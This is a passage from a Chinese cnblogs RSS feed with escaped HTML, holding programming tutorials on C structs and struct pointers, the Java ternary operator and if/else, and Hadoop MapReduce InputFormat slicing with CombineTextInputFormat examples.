    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age;
    &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;&lt;span&gt; score;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; addr[&lt;span&gt;30&lt;/span&gt;&lt;span&gt;];
};
&lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; student str[&lt;span&gt;2&lt;/span&gt;] =&lt;span&gt; {
    {&lt;/span&gt;&lt;span&gt;101&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LILIN&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;m&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;18&lt;/span&gt;,&lt;span&gt;97.5&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;beijing&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;102&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zhang&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;f&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;17&lt;/span&gt;,&lt;span&gt;99&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;shanghai&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;即先声明结构体类型，然后定义数组为该结构体类型，在定义数组是初始化。&lt;/p&gt;
&lt;p&gt;3、指向结构i数据类型的指针&lt;/p&gt;
&lt;p&gt;一个结构体变量的指针就是该结构体变量所占据的内存段的起始地址。&lt;/p&gt;
&lt;p&gt;可以设一个指针变量，用来指向一个结构体变量，此时该指针变量的值是结构体变量的起始地址。&lt;/p&gt;
&lt;p&gt;指针变量也可以用来指向结构体数组中的元素。&lt;/p&gt;
&lt;p&gt;说明的一般形式：struct 结构名 *结构指针变量名&lt;/p&gt;
&lt;p&gt;例：已说明一个指向stu的指针变量pstu，struct stu*pstu;也可在定义stu结构的同时说明pstu。&lt;/p&gt;
&lt;p&gt;与之前讨论的各类指针变量相同，结构指针变量也必须先赋值，然后才能使用。&lt;/p&gt;
&lt;p&gt;赋值是把结构变量的首地址赋予该指针变量，不能把结构名赋予该指针变量。&lt;/p&gt;
&lt;p&gt;例：若boy是被说明为stu类型的结构变量，则：pstu=&amp;amp;boy是正确的，而pstu=&amp;amp;stu是错误的。&lt;/p&gt;
&lt;p&gt;原因：结构名和结构变量是两个不同的概念，结构名只能表示一个结构形式，系统并不能为其分配内存空间，只有当某个变量被说明为这种类型的结构时，才能对变量分配内存空间。&lt;/p&gt;
&lt;p&gt;调用的一般形式为：（*结构指针变量）.成员名或为：结构指针变量→成员名&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
#include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;StdAfx.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;stdio.h&amp;gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; stu
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; num;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;name;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; sex;
    &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;&lt;span&gt; score;
}boy1&lt;/span&gt;={&lt;span&gt;102&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;kun&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;m&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;98.5&lt;/span&gt;&lt;span&gt;};
&lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; main()
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt; stu *&lt;span&gt;pstu;
    pstu&lt;/span&gt;=&amp;amp;&lt;span&gt;boy1;
    printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number=%d\nname=%s\nsex=%c\nscore=%f\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,boy1.num,boy1.name,boy1.sex,boy1.score);
    printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number=%d\nname=%s\nsex=%c\nscore=%f\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,(*pstu).num,(*pstu).name,(*pstu).sex,(*&lt;span&gt;pstu).score);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Fri, 15 Feb 2019 15:30:00 +0000</pubDate>
<dc:creator>巫师笔记</dc:creator>
<og:description>1、结构体变量的初始化 例： 2、结构体数组 一个结构体变量中可以存放一组数据（如一个学生的学号，姓名，成绩等数据）。若有10个学生的数据需要参加运算，显然应用数组，这就是结构体数组。结构体数组与数值</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lvfengkun/p/10385690.html</dc:identifier>
</item>
<item>
<title>三目运算及选择结构的练习😊 - 唐T</title>
<link>http://www.cnblogs.com/www520/p/10386463.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/www520/p/10386463.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;span&gt;★&lt;/span&gt;三目运算和选择结构的练习&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.)三目运算(也称三元运算)：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  a&amp;gt;b?a:b(a代表true，b为false)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;span&gt;a&amp;gt;b?(a&amp;gt;c?a:c):(b&amp;gt;c?b:c)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在几个数字的比较中作判断（例：判断三个值的大小）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.)选择结构：if（x）、if...else 、if...else if...、&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;*&lt;/span&gt;注意x中代表的是boolean值或者Boolean类型&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;3.)案例练习&lt;/span&gt;：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1600354/201902/1600354-20190215231446682-1364939436.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1600354/201902/1600354-20190215231504306-2086086343.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt; &lt;span&gt; 注意：&lt;span lang=&quot;EN-US&quot;&gt;if后面的&lt;span lang=&quot;EN-US&quot;&gt;{}可以省略的，没有&lt;span lang=&quot;EN-US&quot;&gt;{}它只管一行代码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;键盘录入的方式：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1600354/201902/1600354-20190215232559966-8973738.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 15 Feb 2019 15:30:00 +0000</pubDate>
<dc:creator>唐T</dc:creator>
<og:description>★三目运算和选择结构的练习 1.)三目运算(也称三元运算)： a&gt;b?a:b(a代表true，b为false) a&gt;b?(a&gt;c?a:c):(b&gt;c?b:c) 在几个数字的比较</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/www520/p/10386463.html</dc:identifier>
</item>
<item>
<title>大数据技术之_05_Hadoop学习_02_MapReduce_MapReduce框架原理+InputFormat数据输入+MapReduce工作流程(面试重点)+Shuffle机制(面试重点) - 黑泽君</title>
<link>http://www.cnblogs.com/chenmingjun/p/10386461.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenmingjun/p/10386461.html</guid>
<description>&lt;p id=&quot;tocid_0&quot; class=&quot;toc&quot;&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h3mapreduce&quot;&gt;第3章 MapReduce框架原理&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h31inputformat&quot;&gt;3.1 InputFormat数据输入&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h311maptask&quot;&gt;3.1.1 切片与MapTask并行度决定机制&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h312job&quot;&gt;3.1.2 Job提交流程源码和切片源码详解&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h313fileinputformat&quot;&gt;3.1.3 FileInputFormat切片机制&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h314combinetextinputformat&quot;&gt;3.1.4 CombineTextInputFormat切片机制&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h315combinetextinputformat&quot;&gt;3.1.5 CombineTextInputFormat案例实操&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h316fileinputformat&quot;&gt;3.1.6 FileInputFormat实现类&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h317keyvaluetextinputformat&quot;&gt;3.1.7 KeyValueTextInputFormat使用案例&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h318nlineinputformat&quot;&gt;3.1.8 NLineInputFormat使用案例&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h319inputformat&quot;&gt;3.1.9 自定义InputFormat&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h3110inputformat&quot;&gt;3.1.10 自定义InputFormat案例实操&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h32mapreduce&quot;&gt;3.2 MapReduce工作流程（面试重点）&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h33shuffle&quot;&gt;3.3 Shuffle机制（面试重点）&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h331shuffle&quot;&gt;3.3.1 Shuffle机制&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h332partition&quot;&gt;3.3.2 Partition分区&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;toc_item&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;span class=&quot;toc_left&quot;&gt;&lt;a href=&quot;http://www.cnblogs.com/chenmingjun/p/10386461.html#h333partition&quot;&gt;3.3.3 Partition分区案例实操&lt;/a&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;h3mapreduce&quot;&gt;&lt;span&gt;&lt;strong&gt;第3章 MapReduce框架原理&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h31inputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1 InputFormat数据输入&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;h4 id=&quot;h311maptask&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.1 切片与MapTask并行度决定机制&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;1、问题引出&lt;br/&gt;  MapTask的并行度决定Map阶段的任务处理并发度，进而影响到整个Job的处理速度。&lt;br/&gt;  &lt;code&gt;思考：&lt;/code&gt;1G的数据，启动8个MapTask，可以提高集群的并发处理能力。那么1K的数据，也启动8个MapTask，会提高集群性能吗？MapTask并行任务是否越多越好呢？哪些因素影响了MapTask并行度？&lt;/p&gt;
&lt;p&gt;2、MapTask并行度决定机制&lt;br/&gt;  &lt;strong&gt;数据块：&lt;/strong&gt; Block是HDFS物理上把数据分成一块一块的。&lt;br/&gt;  &lt;strong&gt;数据切片：&lt;/strong&gt; 数据切片只是在逻辑上对输入进行分片，并不会在磁盘上将其切分成片进行存储。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryyon.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h312job&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.2 Job提交流程源码和切片源码详解&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;1、Job提交流程源码详解，如下图所示：&lt;/p&gt;
&lt;pre readability=&quot;15.5&quot;&gt;
&lt;code class=&quot;hljs cs&quot; readability=&quot;25&quot;&gt;boolean result = job.waitForCompletion(&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);&lt;p&gt;submit();&lt;/p&gt;&lt;p&gt;&lt;br/&gt;connect();    &lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Cluster(getConfiguration());&lt;br/&gt;initialize(jobTrackAddr, conf); &lt;/p&gt;&lt;p&gt;&lt;br/&gt;submitter.submitJobInternal(Job.&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;, cluster)&lt;br/&gt;Path jobStagingArea = JobSubmissionFiles.getStagingDir(cluster, conf);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;JobID jobId = submitClient.getNewJobID();&lt;/p&gt;&lt;p&gt;&lt;br/&gt;copyAndConfigureFiles(job, submitJobDir);    &lt;br/&gt;rUploader.uploadFiles(job, jobSubmitDir);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;writeSplits(job, submitJobDir);&lt;br/&gt;maps = writeNewSplits(job, jobSubmitDir);&lt;br/&gt;input.getSplits(job);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;writeConf(conf, submitJobFile);&lt;br/&gt;conf.writeXml(&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;status = submitClient.submitJob(jobId, submitJobDir.toString(), job.getCredentials());&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如下图所示：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryhyF.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;2、FileInputFormat切片源码解析(input.getSplits(job))&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kry2WV.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h313fileinputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.3 FileInputFormat切片机制&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;FileInputFormat切片机制&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/krysds.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;FileInputFormat切片大小的参数配置&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryrZj.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h314combinetextinputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.4 CombineTextInputFormat切片机制&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;  框架默认的TextInputFormat切片机制是对任务按文件规划切片，&lt;code&gt;不管文件多小，都会是一个单独的切片&lt;/code&gt;，都会交给一个MapTask，这样如果有大量小文件，就&lt;code&gt;会产生大量的MapTask&lt;/code&gt;，处理效率极其低下。之前处理小文件(har文件)使用的方法是归档。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1、应用场景：&lt;br/&gt;  CombineTextInputFormat用于小文件过多的场景，它可以将多个小文件从逻辑上规划到一个切片中，这样，多个小文件就可以交给一个MapTask处理。&lt;/li&gt;
&lt;li&gt;2、虚拟存储切片最大值设置&lt;br/&gt;  CombineTextInputFormat.setMaxInputSplitSize(job, 4194304); // 4m&lt;br/&gt;  &lt;code&gt;注意：&lt;/code&gt;虚拟存储切片最大值设置最好根据实际的小文件大小情况来设置具体的值。&lt;/li&gt;
&lt;li&gt;3、切片机制&lt;br/&gt;  生成切片过程包括：虚拟存储过程和切片过程二部分。&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryciq.png&quot; alt=&quot;&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;（1）虚拟存储过程：&lt;br/&gt;  将输入目录下所有文件大小，依次和设置的setMaxInputSplitSize值比较，如果不大于设置的最大值，逻辑上划分一个块。如果输入文件大于设置的最大值且大于两倍，那么以最大值切割一块；当剩余数据大小超过设置的最大值且不大于最大值2倍，此时将文件均分成2个虚拟存储块（防止出现太小切片）。&lt;br/&gt;  例如setMaxInputSplitSize值为4M，输入文件大小为8.02M，则先逻辑上分成一个4M。剩余的大小为4.02M，如果按照4M逻辑划分，就会出现0.02M的小的虚拟存储文件，所以将剩余的4.02M文件切分成（2.01M和2.01M）两个文件。&lt;br/&gt;（2）切片过程：&lt;br/&gt;  （a）判断虚拟存储的文件大小是否大于setMaxInputSplitSize值，大于等于则单独形成一个切片。&lt;br/&gt;  （b）如果不大于则跟下一个虚拟存储文件进行合并，共同形成一个切片。&lt;br/&gt;  （c）测试举例：有4个小文件大小分别为1.7M、5.1M、3.4M以及6.8M这四个小文件，则虚拟存储之后形成6个文件块，大小分别为：&lt;br/&gt;  1.7M，（2.55M、2.55M），3.4M以及（3.4M、3.4M）&lt;br/&gt;  最终会形成3个切片，大小分别为：&lt;br/&gt;  （1.7+2.55）M，（2.55+3.4）M，（3.4+3.4）M&lt;/p&gt;
&lt;h4 id=&quot;h315combinetextinputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.5 CombineTextInputFormat案例实操&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;1、需求&lt;br/&gt;  将输入的大量小文件合并成一个切片统一处理。&lt;br/&gt;（1）输入数据&lt;br/&gt;  准备4个小文件&lt;br/&gt;（2）期望&lt;br/&gt;  期望一个切片处理4个文件&lt;br/&gt;2、实现过程&lt;br/&gt;&lt;strong&gt;（1）不做任何处理，运行1.6节的WordCount案例程序，观察切片个数为4。&lt;/strong&gt;&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/krygJ0.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;strong&gt;（2）在WordcountDriver中增加如下代码，运行程序，并观察运行的切片个数为3。&lt;/strong&gt;&lt;br/&gt;（a）驱动类中添加代码如下：
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;3&quot;&gt;&lt;br/&gt;job.setInputFormatClass(CombineTextInputFormat.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;p&gt;&lt;br/&gt;CombineTextInputFormat.setMaxInputSplitSize(job, &lt;span class=&quot;hljs-number&quot;&gt;4194304&lt;/span&gt;);&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（b）运行如果为3个切片。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryRzT.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;strong&gt;（3）在WordcountDriver中增加如下代码，运行程序，并观察运行的切片个数为1。&lt;/strong&gt;&lt;br/&gt;（a）驱动中添加代码如下：
&lt;pre readability=&quot;4.5&quot;&gt;
&lt;code class=&quot;hljs dart&quot; readability=&quot;3&quot;&gt;&lt;br/&gt;job.setInputFormatClass(CombineTextInputFormat.&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt;);&lt;p&gt;&lt;br/&gt;CombineTextInputFormat.setMaxInputSplitSize(job, &lt;span class=&quot;hljs-number&quot;&gt;20971520&lt;/span&gt;);&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（b）运行如果为1个切片。&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryOSK.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h316fileinputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.6 FileInputFormat实现类&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryToR.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;Ctrl + t 可得：&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryfQU.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;1、TextInputFormat&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryIeJ.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;2、KeyValueTextInputFormat&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kry4L4.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;3、NLineInputFormat&lt;br/&gt;&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kryow9.png&quot; alt=&quot;&quot;/&gt;&lt;h4 id=&quot;h317keyvaluetextinputformat&quot;&gt;&lt;span&gt;&lt;strong&gt;3.1.7 KeyValueTextInputFormat使用案例&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;1、需求&lt;br/&gt;统计输入文件中每一行的第一个单词相同的行数。&lt;br/&gt;（1）输入数据&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs nginx&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;banzhang&lt;/span&gt; ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;banzhang ni hao&lt;br/&gt;xihuan hadoop banzhang&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;（2）期望结果数据&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs nginx&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;banzhang&lt;/span&gt;    &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;&lt;br/&gt;xihuan    &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2、需求分析&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s2.ax1x.com/2019/02/15/kr6pTA.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;3、代码实现&lt;br/&gt;（1）编写Mapper类
&lt;pre readability=&quot;12.5&quot;&gt;
&lt;code class=&quot;hljs java&quot; readability=&quot;19&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;package&lt;/span&gt; com.atguigu.mr.kv;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; java.io.IOException;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.LongWritable;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.io.Text;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;import&lt;/span&gt; org.apache.hadoop.mapreduce.Mapper;&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;hljs-class&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;KVTextMapper&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;Mapper&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;Text&lt;/span&gt;, &lt;span class=&quot;hljs-title&quot;&gt;LongWritable&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;/p&gt;&lt;p&gt;&lt;br/&gt;LongWritable v = &lt;span 